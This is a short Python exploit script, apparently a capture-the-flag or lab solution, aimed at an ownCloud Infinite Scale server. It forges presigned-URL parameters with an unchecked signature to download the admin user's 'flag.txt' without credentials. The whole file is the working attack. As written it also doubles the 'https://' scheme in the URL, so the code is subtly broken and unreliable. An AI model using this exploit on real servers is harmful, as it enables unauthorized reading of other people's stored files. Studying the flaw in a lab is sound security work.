import requests

OCIS_URL = "https://ocis-app:9200"
USERNAME = "admin"
FILE = "flag.txt"
EXPLOIT_URL_TEMPLATE = "https://{}/remote.php/dav/files/{}/{}?OC-Credential={}&OC-Verb=GET&OC-Expires=60&OC-Date=2024-01-27T00:00:00.000Z&OC-Signature=notchecked"
EXPLOIT_URL = EXPLOIT_URL_TEMPLATE.format(OCIS_URL, USERNAME, FILE, USERNAME)

response = requests.get(EXPLOIT_URL)

if response.status_code == 200:
    print(response.text)
else:
    print(f"Failed to download file: {response.status_code}")
